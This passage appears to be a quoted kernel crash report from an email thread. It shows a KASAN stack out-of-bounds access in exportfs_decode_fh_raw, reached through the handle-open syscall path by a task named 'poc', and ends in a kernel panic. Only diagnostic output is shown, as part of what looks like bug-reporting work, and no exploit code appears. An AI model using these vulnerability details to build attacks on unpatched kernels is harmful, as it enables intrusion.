> [   23.448576][  T178]  ? _raw_spin_unlock+0x2d/0x80
> [   23.448578][  T178]  ? trace_preempt_on+0x2c/0x40
> [   23.448581][  T178]  reconnect_path+0x20c/0x2c0
> [   23.448583][  T178]  ? __pfx_vfs_dentry_acceptable+0x40/0x40
> [   23.448586][  T178]  exportfs_decode_fh_raw+0x5a3/0x880
> [   23.448588][  T178]  ? __pfx_exportfs_decode_fh_raw+0x40/0x40
> [   23.448594][  T178]  ? __might_fault+0xad/0x140
> [   23.448596][  T178]  ? __lock_release.isra.0+0x5d/0x180
> [   23.448598][  T178]  ? __might_fault+0xad/0x140
> [   23.448601][  T178]  handle_to_path+0x524/0x880
> [   23.448603][  T178]  ? __pfx_handle_to_path+0x40/0x40
> [   23.448606][  T178]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
> [   23.448608][  T178]  ? lockdep_hardirqs_on+0x7f/0x140
> [   23.448611][  T178]  ? do_handle_open+0x7e/0x200
> [   23.448613][  T178]  do_handle_open+0x7e/0x200
> [   23.448615][  T178]  ? __pfx_do_handle_open+0x40/0x40
> [   23.448617][  T178]  ? rcu_is_watching+0x15/0xc0
> [   23.448619][  T178]  ? do_syscall_64+0x129/0xf00
> [   23.448621][  T178]  ? trace_preempt_enable+0xac/0x180
> [   23.448623][  T178]  do_syscall_64+0x17a/0xf00
> [   23.448625][  T178]  ? do_syscall_64+0x129/0xf00
> [   23.448626][  T178]  ? clear_bhb_loop+0x60/0xc0
> [   23.448628][  T178]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> [   23.448630][  T178] RIP: 0033:0x41bf74
> [   23.448632][  T178] Code: 89 02 48 c7 c0 ff ff ff ff eb b4 e8 e6 08 0=
0 00 66 0f 1f 44 00 00 f3 0f 1e fa 80 3d ed 80 09 00 00 74 13 b8 30 01 00 =
00 0f 05 5
> [   23.448634][  T178] RSP: 002b:00007fffce51fac8 EFLAGS: 00000202 ORIG_=
RAX: 0000000000000130
> [   23.448636][  T178] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: =
000000000041bf74
> [   23.448638][  T178] RDX: 0000000000010000 RSI: 00007fffce51fb30 RDI: =
0000000000000003
> [   23.448639][  T178] RBP: 0000000000000003 R08: 0000000000000000 R09: =
0000000000000000
> [   23.448640][  T178] R10: 0000000000000000 R11: 0000000000000202 R12: =
0000000000000102
> [   23.448641][  T178] R13: 0000000000000003 R14: 00007fffce51fb30 R15: =
00007fffce51fc10
> [   23.448644][  T178]  </TASK>
> [   23.448645][  T178]
> [   23.462123][  T178] The buggy address belongs to stack of task poc/17=
8
> [   23.462403][  T178]  and is located at offset 64 in frame:
> [   23.462639][  T178]  exportfs_decode_fh_raw+0x0/0x880
> [   23.462860][  T178]
> [   23.462961][  T178] This frame has 2 objects:
> [   23.463159][  T178]  [32, 48) 'path'
> [   23.463161][  T178]  [64, 320) 'nbuf'
> [   23.463320][  T178]
> [   23.463582][  T178] The buggy address belongs to the physical page:
> [   23.463852][  T178] page: refcount:0 mapcount:0 mapping:0000000000000=
000 index:0x0 pfn:0x10a67f
> [   23.464228][  T178] flags: 0x17ffffc0000000(node=3D0|zone=3D2|lastcpu=
pid=3D0x1fffff)
> [   23.464540][  T178] raw: 0017ffffc0000000 ffffea0004299fc8 ffffea0004=
299fc8 0000000000000000
> [   23.464899][  T178] raw: 0000000000000000 0000000000000000 00000000ff=
ffffff 0000000000000000
> [   23.465263][  T178] page dumped because: kasan: bad access detected
> [   23.465532][  T178]
> [   23.465633][  T178] Memory state around the buggy address:
> [   23.465869][  T178]  ffff88810a67fb80: f1 f1 f1 f1 00 00 f2 f2 00 00 =
00 00 00 00 00 00
> [   23.466212][  T178]  ffff88810a67fc00: 00 00 00 00 00 00 00 00 00 00 =
00 00 00 00 00 00
> [   23.466549][  T178] >ffff88810a67fc80: 00 00 00 00 00 00 00 00 f3 f3 =
f3 f3 f3 f3 f3 f3
> [   23.466886][  T178]                                            ^
> [   23.467152][  T178]  ffff88810a67fd00: 00 00 00 00 00 00 00 00 00 00 =
00 00 00 00 00 00
> [   23.467489][  T178]  ffff88810a67fd80: f1 f1 f1 f1 00 00 00 f2 f2 f2 =
f2 f2 00 f3 f3 f3
> [   23.467826][  T178] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D
> [   23.468184][  T178] Kernel panic - not syncing: kasan.fault=3Dpanic s=
et ...
> ```
>=20

